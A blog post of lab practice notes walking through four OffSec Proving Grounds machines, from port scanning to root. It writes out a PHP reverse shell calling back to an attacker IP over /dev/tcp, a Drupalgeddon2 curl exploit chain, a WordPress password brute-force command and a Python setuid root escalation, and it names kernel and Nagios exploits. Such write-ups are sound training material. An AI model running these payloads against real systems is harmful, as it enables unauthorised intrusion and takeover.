<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="OffSec PG - Katana, Lampiao, Loly, Monitoring" /><meta property="og:locale" content="en" /><meta name="description" content="Katana" /><meta property="og:description" content="Katana" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set4/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set4/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - Katana, Lampiao, Loly, Monitoring" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"Katana","headline":"OffSec PG - Katana, Lampiao, Loly, Monitoring","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set4/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set4/"}</script><title>OffSec PG - Katana, Lampiao, Loly, Monitoring | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/blog/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/blog/">Tanishq Rupaal</a><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - Katana, Lampiao, Loly, Monitoring</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>OffSec PG - Katana, Lampiao, Loly, Monitoring</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1724 words" > <em>9 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">OffSec PG - Katana, Lampiao, Loly, Monitoring</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">OffSec PG - Katana, Lampiao, Loly, Monitoring</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="katana"><span class="me-2">Katana</span><a href="#katana" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.51.83</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>vsftpd 3.0.3<tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))<tr><td>7080<td>HTTPS<td>Litespeed httpd<tr><td>8088<td>HTTP<td>Litespeed httpd<tr><td>8715<td>HTTP<td>nginx 1.14.2</table></div><p>Therefore, a bunch of ports are open for http → 80, 7080, 8088, 8715, ftp on port 21 and ssh on port 22.</p><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.51.83 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>The result for the port 7080 revealed nothing. The scan for port 80 resulted in the following finds →</p><ul><li>ebook/ (301)<li>server-status (403)</ul><p>Directories/files listed for port 8088 →</p><ul><li>index.html<li>cgi-bin/ (301)<li>img/ (301)<li>docs/ (301)<li>upload.html<li>upload.php<li>css/ (301)<li>protected/ (301)<li>blocked/ (301)<li>phpinfo.php</ul><p>The scan for the port 8715 revealed nothing.</p><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the status codes <code class="language-plaintext highlighter-rouge">200</code> for the enumeration of port 8088, there are two files <code class="language-plaintext highlighter-rouge">upload.html</code> and <code class="language-plaintext highlighter-rouge">upload.php</code>. These are connected and are an upload capability. Uploading a file on the port 8088 website allows for the file to be accessed on a different web server. This web server is that running on port 8715. However, after testing txt and php files, php files are accessible while txt files need a password. Therefore, a php file can be used to create a reverse shell. Used the following php payload for the reverse shell →</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.49.187/3002 0&gt;&amp;1'"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>A good resource for a reverse shell is <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentest Monkey PHP reverse shell</a>.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The reverse shell, therefore is the <code class="language-plaintext highlighter-rouge">www-data</code> user on the machine. This gives the user flag. Checked sudo capabilities for the user, but there were none. Search for setuid binaries did not give any results as well.</p><p>The next checks are to be made for capabilities. Used <code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code> to list files with capabilities set. The result includes the entry → <code class="language-plaintext highlighter-rouge">/usr/bin/python2.7 = cap_setuid+ep</code>.</p><p>Therefore, the following python code can be invoked using the said binary to elevate privileges → <code class="language-plaintext highlighter-rouge">/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code>. This gives the root flag.</p><hr /><h2 id="lampiao"><span class="me-2">Lampiao</span><a href="#lampiao" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.56.48</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.56.48</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP?<td>-<tr><td>1898<td>HTTP<td>Apache httpd 2.4.7 ((Ubuntu)) &amp; Drupal 7</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Robots.txt check by nmap listed a ton of directories and files for all user agents. Therefore, listed the entire file using curl, which resulted in the following interesting entries →</p><ul><li>admin/<li>user/register/<li>user/password/<li>user/login/<li>?q=admin<li>?q=comment/reply/<li>?q=user/register/<li>?q=user/password/</ul><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.56.48 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Directories/files listed were common with robots.txt finding and the important ones were →</p><ul><li>install.php<li>update.php<li>cron.php<li>xmlrpc.php<li>index.php<li>misc/<li>scripts/<li>includes/<li>sites/<li>modules/<li>themes/</ul><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Nothing in the directory and file brute force was particularly interesting. The /CHANGELOG.txt file can be looked at to identify the exact version of software running on the server. This revealed the latest version to be Drupal 7.54.</p><p>A particular exploit from Google-fu is the drupalgeddon2. For the version 7.5X, the PoC for the <code class="language-plaintext highlighter-rouge">?q=user/password</code> would work well. The exploit is basically a lack of input validation in Drupal 7 Form API. This attack targets AJAX requests composed of Drupal Form API’s renderable arrays, which are used to render a requested page through Drupal’s theming system.</p><p>Renderable arrays are implemented by an associative array and pass key-value pairs as function arguments or form data in order to render markup and UI elements in a meaningful way. Markup element properties have keys prefixed with the ‘#’ character. These parameters were not sanitized. The exploit code had to target the rendering phase of either a page load or AJAX request with malicious code passed to one of the Form API executable functions. The 4 possibilities were →</p><ol><li>[#post_render]<li>[#pre_render]<li>[#access_callback]<li>[#lazy_builder]</ol><p>To exploit, the following set of 2 commands can be executed to get the result of a bash command on the server →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>### 1st command - payload is "which nc" to check if nc is there on the system.
url_pre="http://192.168.56.48:1898/?q=user/password&amp;name"
url_post="$url_pre\[%23post_render\]\[\]=passthru&amp;name\[%23type\]=markup&amp;name\[%23markup\]="
final_url="$url_post=which+nc"
form_data=$( curl -k -s $(echo final_url) --data "form_id=user_pass&amp;_triggering_element_name=name")
form_build=$(echo form_data | grep form_build_id)
form_build_id=$(echo form_build | sed -E 's/.*name="form_build_id" value="(.*)".*/\1/' )

### 2nd command, which returns the result of the above payload.
curl -k -i "http://192.168.56.48:1898/?q=file/ajax/name/%23value/${form_build_id}" \
    --data "form_build_id=${form_build_id}"
</pre></table></code></div></div><p>This gave an indication that nc was present on the system, therefore a reverse shell could be generated for it.</p><p>However, an nc shell did not work. It is known that there is php on the system. Therefore, after checking the presence of wget, the php reverse shell from pentest monkey is sent to the server. With a local netcat listener and navigating to the reverse shell path, a shell with the user <code class="language-plaintext highlighter-rouge">www-data</code> is obtained.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looking at <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a number of users are determined. SetUID binaries do not have any interesting information. The <code class="language-plaintext highlighter-rouge">/etc/passwd</code> contains the hashed password for the <code class="language-plaintext highlighter-rouge">root</code> user. This was sent to john for a cracking attempt, which did not reveal anything.</p><p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory shows the presence of a user <code class="language-plaintext highlighter-rouge">tiago</code>. Google-fu for default drupal config files reveals the location as <code class="language-plaintext highlighter-rouge">settings.php</code> file inside the <code class="language-plaintext highlighter-rouge">sites/default/</code> directory. This reveals the mysql database connection credentials as <code class="language-plaintext highlighter-rouge">drupaluser:Virgulino</code>. Trying the password for the user <code class="language-plaintext highlighter-rouge">tiago</code> successfully logs in. This gives the user flag.</p><h4 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The <code class="language-plaintext highlighter-rouge">tiago</code> user is not allowed to run sudo either. Therfore, looking at other information and running the linux enumeration script. Looking at the kernel version, which is 4.4.0, Google-fu points to the presence of the Dirty Cow exploit.</p><p>Therefore, looking at PoCs from <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">Dirty Cow PoCs</a>, choosing the <code class="language-plaintext highlighter-rouge">cowroot.c</code> payload to get the root shell. Therefore, compiling for 32 bit version to match target. Compiled it with gcc and sent the binary to the target machine via wget.</p><p>Executing this gives the root shell and thus the root flag.</p><hr /><h2 id="loly"><span class="me-2">Loly</span><a href="#loly" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.225.121</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.121</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>80<td>HTTP<td>nginx 1.10.3 (Ubuntu)<tr><td>6311<td>-<td>-</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.225.121 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed → wordpress/</p><p>Busting the <code class="language-plaintext highlighter-rouge">/wordpress/</code> directory gives the following result →</p><ul><li>index.php (301)<li>wp-content/<li>wp-login.php<li>license.txt<li>wp-includes/ (403)<li>readme.html<li>wp-trackback.php<li>wp-admin/ (302)</ul><p>WPScan determines generic stuff and a user <code class="language-plaintext highlighter-rouge">loly</code>. Using this for a brute force attack with command <code class="language-plaintext highlighter-rouge">docker run -v /home/tanq/installations/SecLists/:/seclists/ -it --rm wpscanteam/wpscan --url http://192.168.225.121/wordpress/ -U loly -P /seclists/rockyou.txt</code> gives the credentials as <code class="language-plaintext highlighter-rouge">loly:fernando</code> for XMLRPC.</p><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Logging in to the <code class="language-plaintext highlighter-rouge">/wordpress/wp-login.php</code> as <code class="language-plaintext highlighter-rouge">loly</code> may work but does not move forward because of the requests being directed at <code class="language-plaintext highlighter-rouge">http://loly.lc</code> instead of the IP address. Therefore, this entry is added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to enable navigation. Then the login page is visited and login is attempted as <code class="language-plaintext highlighter-rouge">loly</code>. This grants the admin page on the wordpress website.</p><p>The homepage has a plugin called <code class="language-plaintext highlighter-rouge">Adrotate</code> running. On this webpage, a section called “Manage Media”. This says →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Accepted files: jpg, jpeg, gif, png, svg, html, js and zip. Maximum size is 512Kb per file.
Important: Make sure your file has no spaces or special characters in the name. Replace spaces
with a - or _. Zip files are automatically extracted in the location where they are uploaded
and the original zip file will be deleted once extracted. You can create top-level folders below.
Folder names can between 1 and 100 characters long. Any special characters are stripped out.
</pre></table></code></div></div><p>Therefore, uploading a reverse shell php code after zipping and uploading could allow navigating to it. The content is stored in the <code class="language-plaintext highlighter-rouge">/wordpress/wp-content/banners/</code> directory. Therefore, a shell is gained by listening on netcat and navigating to the php file in the said path. This is as the user <code class="language-plaintext highlighter-rouge">www-data</code> and this gives the user flag.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user-1"><span class="me-2">User</span><a href="#user-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looking at the wordpress files, the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file contains a password <code class="language-plaintext highlighter-rouge">lolyisabeautifulgirl</code>. Trying this password for <code class="language-plaintext highlighter-rouge">loly</code>, it works and grants the shell as <code class="language-plaintext highlighter-rouge">loly</code>.</p><h4 id="root-1"><span class="me-2">Root</span><a href="#root-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Looking at the kernel version for the machine (4.4.0-31), there are a list of exploits. Starting with exploits from the highest 4.X version, one worked (45010.c). This gave the root shell and thus the root flag.</p><hr /><h2 id="monitoring"><span class="me-2">Monitoring</span><a href="#monitoring" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.51.136</code></p><h4 id="network-scan-3"><span class="me-2">Network Scan</span><a href="#network-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.136</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">Host: ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)<tr><td>25<td>SMTP<td>Postfix smtpd<tr><td>80<td>HTTP<td>Apache httpd 2.4.18 ((Ubuntu))<tr><td>389<td>LDAP<td>OpenLDAP 2.2.X - 2.3.X<tr><td>443<td>HTTPS<td>Apache httpd 2.4.18 ((Ubuntu))<tr><td>5667<td>Unknown<td>-</table></div><h4 id="web-scan-3"><span class="me-2">Web Scan</span><a href="#web-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.51.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Directories/files listed (for both http and https versions) →</p><ul><li>index.php<li>javascript/<li>nagios/</ul><p>Visiting the web page reveals a <code class="language-plaintext highlighter-rouge">nagiosxi</code> directory which has a login.</p><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>A web search for default admin credentials on nagios xi reveals <code class="language-plaintext highlighter-rouge">nagiosadmin:PASSW0RD</code>, however, after trial and error of easy passwords, <code class="language-plaintext highlighter-rouge">admin</code> was the correct password.</p><p>Searchsploit and web searches return a number of exploits for the nagios version. One of them is an authenticated RCE in the mointoring plugin upload capability.</p><p>Command used for searchsploit is as follows → <code class="language-plaintext highlighter-rouge">searchsploit nagios</code>, which returned many results. Spiraling down to RCE for version 5.6.5 (just above 5.6.0 and has root exploit), the full path can be received as follows → <code class="language-plaintext highlighter-rouge">searchsploit -p php/webapps/47299.php</code>. This gives the path and the exploit can be copied from there.</p><p>The exploit is basically a file upload where the name for the upload has an injection of commands such that it is executed in the backend. Therefore, a reverse shell can be executed on the backend, giving root access.</p><p>Setting up the exploit and calling it via the cli after setting up an <code class="language-plaintext highlighter-rouge">ncat</code> listener, a root shell is received. The flag of the root user can thus be read.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>User was already root, therefore, no escalation was necessary.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20Katana,%20Lampiao,%20Loly,%20Monitoring%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set4%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20Katana,%20Lampiao,%20Loly,%20Monitoring%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set4%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set4%2F&text=OffSec%20PG%20-%20Katana,%20Lampiao,%20Loly,%20Monitoring%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set4%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside 